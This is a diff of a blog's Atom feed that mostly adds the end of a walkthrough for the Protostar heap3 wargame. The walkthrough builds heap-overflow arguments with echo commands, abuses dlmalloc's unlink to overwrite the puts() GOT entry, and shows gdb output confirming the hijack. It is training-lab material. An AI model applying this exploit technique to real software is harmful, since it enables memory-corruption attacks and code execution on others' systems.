+chunk. The chunk&rsquo;s data starts at <code>0x804c030</code> and ends 32 bytes later at <code>0x804c050</code>. The third
+chunk&rsquo;s <code>size</code> is four bytes later at <code>0x804c054</code>. So we can use 32 + 4 = 36 characters as padding.
+Let&rsquo;s pick 100 as the size of the third chunk. 100 = 0x64. We also have to set the last bit to 1 to
+indicate the second or previous chunk is in use. So the third chunk&rsquo;s size should be <code>0x65</code>. So our
+second argument can have 36 <code>B</code>&rsquo;s as padding followed by <code>\x65</code>.</p>
+
+<pre><code>user@protostar:$ echo -en "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x65" &gt; /tmp/B
+</code></pre>
+
+<p>Now we craft the third and final argument. The structure for it will be some padding + some four
+bytes to be determined + some size + <code>FD</code> + <code>BK</code>.</p>
+
+<p>The third chunk starts at <code>0x804c050</code>. It used to end 40 bytes later at <code>0x804c078</code>, but we
+overwrote its size to <code>0x65</code> or 100. So now it ends 100 bytes later at <code>0x804c0b4</code>. We want to
+trigger <code>unlink()</code> on the third chunk when we <code>free()</code> it. We&rsquo;ve already ensured it&rsquo;s not a fastbin
+by setting its size to be greater than 80 bytes. The next condition is to make dlmalloc consolidate
+this chunk with either the chunk before or after. Since we&rsquo;re using the previous chunk, let&rsquo;s fool
+dlmalloc into thinking the next chunk is free.</p>
+
+<p>I know what you&rsquo;re thinking. There&rsquo;s no fourth chunk. That&rsquo;s right, but we&rsquo;ll make dlmalloc think
+there is. In order to check a chunk is free, dlmalloc looks at the <code>PREV_INUSE</code> bit of the next
+chunk. To find the next chunk, dlmalloc adds the size of the current chunk to the current chunk&rsquo;s
+address. You can see this at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L3259">line 3259</a>.</p>
+
+<pre><code>if (!(inuse_bit_at_offset(next, nextsz)))   /* consolidate forward */
+</code></pre>
+
+<p><code>inuse_bit_at_offset()</code> is a macro defined at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L1410-L1411">line 1410</a>.</p>
+
+<pre><code>#define inuse_bit_at_offset(p, s) \
+  (chunk_at_offset((p), (s))-&gt;size &amp; PREV_INUSE)
+</code></pre>
+
+<p><code>chunk_at_offset()</code> is defined at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L1381">line 1381</a>.</p>
+
+<pre><code>#define chunk_at_offset(p, s)  BOUNDED_1((mchunkptr)(((char*)(p)) + (s)))
+</code></pre>
+
+<p>So let&rsquo;s write a small size at <code>0x804c0b8</code> to make dlmalloc think the fifth chunk is close by and so
+we don&rsquo;t have to add too much padding to our third argument. A size like <code>0x20</code>. We&rsquo;ll have to write
+it as <code>\x00\x00\x00\x20</code>. But we have a problem here. C treats <code>\x00</code> as the end of a string, and
+thus <code>strcpy()</code> will stop copying any string up to and including that <code>NUL</code>. We won&rsquo;t be able to add
+any more bytes after that. This means we cannot insert <code>\x00</code> in the middle of any of our inputs.</p>
+
+<p>But all is not lost. We want a small number for the fourth chunk&rsquo;s size. What&rsquo;s another way of
+summing to a small number, at least in the way computers represent integers? In non-modular
+arithmetic, the only way two integers can produce a small sum is if they themselves are smaller. In
+modular arithmetic, a small integer can be the sum of large numbers that are greater than the
+modulus.</p>
+
+<p>Take a closer look at how <code>chunk_at_offset()</code> is defined. It sums two numbers with no sanity checks.
+So we can write a really big number with no null bytes that <code>strcpy()</code> won&rsquo;t stop on and will make
+dlmalloc think the next fifth chunk is close by. Even better, we can use the first byte of the
+fourth chunk as the fifth chunk&rsquo;s size. How can we make dlmalloc think the fifth chunk is four bytes
+ahead of the fourth chunk? We do this with <code>0xfffffffc</code> which is -2 in two&rsquo;s complement for signed
+integers. So <code>0xfffffffc</code> at <code>0x804c0b8</code> will point to a fifth chunk&rsquo;s size four bytes earlier at
+<code>0x804c0b4</code>. This word&rsquo;s last bit must be set to 0 to indicate the fourth chunk is free. We can
+simply use <code>0xfffffffc</code> again here.</p>
+
+<p>We want <code>(FD + 12)</code> to equal <code>0x804b128</code>. So FD should be <code>0x804b128</code> - 12 = <code>0x804b11c</code>. In the above
+we decided to make <code>BK</code> <code>0x0804c014</code>. We have</p>
+
+<pre><code>user@protostar:/tmp$ echo -en "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08" &gt; /tmp/C
+</code></pre>
+
+<p>92 <code>C</code>&rsquo;s of padding, two <code>0xfffffffc</code> words, <code>FD</code>, followed by <code>BK</code>.</p>
+
+<h2>Checking it works</h2>
+
+<p>With the same gdb session as above, run the program with the three arguments.</p>
+
+<pre><code>(gdb) r $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /opt/protostar/bin/heap3 $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
+0x804c000:  Error while running hook_stop:
+Cannot access memory at address 0x804c000
+
+Breakpoint 1, malloc (bytes=32) at common/malloc.c:3211
+3211    in common/malloc.c
+</code></pre>
+
+<p>Let&rsquo;s continue until we stop at the first <code>free()</code> call.</p>
+
+<pre><code>(gdb) c
+Continuing.
+...
+
+Breakpoint 3, free (mem=0x804c058) at common/malloc.c:3583
+3583    in common/malloc.c
+</code></pre>
+
+<p>Examine the GOT entry for <code>puts()</code>.</p>
+
+<pre><code>(gdb) x 0x804b128
+0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x08048796
+</code></pre>
+
+<p>Continue and see that <code>free(c)</code> has overwritten the contents to the address of our shellcode!</p>
+
+<pre><code>(gdb) c
+Continuing.
+0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
+0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
+0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
+0x804c030:  0x42424242  0x42424242  0x42424242  0x42424242
+0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
+0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
+0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
+0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
+0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
+
+Breakpoint 3, free (mem=0x804c030) at common/malloc.c:3583
+3583    in common/malloc.c
+(gdb) x 0x804b128
+0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x0804c014
+</code></pre>
+
+<p>Let the rest of the program run to see <code>winner()</code> is called.</p>
+
+<pre><code>Breakpoint 4, 0x08048790 in puts@plt ()
+(gdb) si
+0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
+0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
+0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
+0x804c030:  0x00000000  0x42424242  0x42424242  0x42424242
+0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
+0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
+0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
+0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
+0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x0804c014 in ?? ()
+(gdb) si
+0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
+0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
+0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
+0x804c030:  0x00000000  0x42424242  0x42424242  0x42424242
+0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
+0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
+0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
+0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
+0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x0804c019 in ?? ()
+(gdb) si
+0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
+0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
+0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
+0x804c030:  0x00000000  0x42424242  0x42424242  0x42424242
+0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
+0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
+0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
+0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
+0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
+winner () at heap3/heap3.c:8
+8   heap3/heap3.c: No such file or directory.
+    in heap3/heap3.c
+(gdb) c
+Continuing.
+that wasn't too bad now, was it? @ 1587442625
+
+Program received signal SIGSEGV, Segmentation fault.
+0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
+0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
+0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
+0x804c030:  0x00000000  0x42424242  0x42424242  0x42424242
+0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
+0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
+0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
+0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
+0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
+0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x0804c01b in ?? ()
+</code></pre>
+
+<p>Now let&rsquo;s run it without gdb.</p>
+
+<pre><code>user@protostar:~$ /opt/protostar/bin/./heap3 $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
+that wasn't too bad now, was it? @ 1587443061
+Segmentation fault
+</code></pre>
+
+<p>Amazing.</p>
+
+<h3>References</h3>
+
+<ul>
+<li><a href="https://www.youtube.com/watch?v=HWhzH--89UQ&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;index=26">https://www.youtube.com/watch?v=HWhzH&#8211;89UQ&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;index=26</a></li>
+<li><a href="https://medium.com/@c0ngwang/the-art-of-exploiting-heap-overflow-part-6-14410c9ba6a6">https://medium.com/@c0ngwang/the-art-of-exploiting-heap-overflow-part-6-14410c9ba6a6</a></li>
+</ul>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[How to Expose a Localhost-only Endpoint on GKE]]></title>
@@ -35,6 +836,9 @@ interface. <strong>So how can we expose these metrics, i.e. make the HTTP endpoi
 <li>If something you need is running on a computer you control, you can always find a way extract info
 from it if you&rsquo;re resourceful enough.</li>
 </ul>
+
+
+<!-- more -->
 
 
 <h2>My specific GKE cluster configuration</h2>
@@ -372,6 +1176,9 @@ vendor-managed services.</p>
 <li>always load test new features above and beyond what you expect your production load will be</li>
 <li>use proper load testing tools and not bash for loops</li>
 </ul>
+
+
+<!-- more -->
 
 
 <h2>My specific GKE cluster configuration</h2>
@@ -1100,22 +1907,6 @@ from finishing this effort.</p>
 
 <p>Nonetheless, it&rsquo;ll be much nicer to change k8s resources in a type-safe way
 instead of parsing and rewriting raw YAML strings.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Useful Site for TLS Server Test]]></title>
-    <link href="https://www.davidxia.com/2017/05/useful-site-for-testing-tls-server-configuration/"/>
-    <updated>2017-05-20T12:49:20-04:00</updated>
-    <id>https://www.davidxia.com/2017/05/useful-site-for-testing-tls-server-configuration</id>
-    <content type="html"><![CDATA[<p>My home server&rsquo;s hard disk&rsquo;s partition map was somehow corrupted. So I&rsquo;m serving this website
-from <a href="https://m.do.co/c/74c553045962">Digital Ocean</a> for now instead of my apartment. While rewriting the nginx server configs,
-I found this useful site that <a href="https://www.ssllabs.com/ssltest/index.html">tests your server&rsquo;s TLS configuration</a>. It&rsquo;ll give you a grade
-and warn you of weak encryption, key exchange protocols, cipher suites, etc.</p>
-
-<p><a href="https://mozilla.github.io/server-side-tls/ssl-config-generator/">Mozilla&rsquo;s TLS configuration generator</a> is useful for providing secure defaults.</p>
-
-<p>I&rsquo;m proud to say this site has an A.</p>
 ]]></content>
   </entry>
   
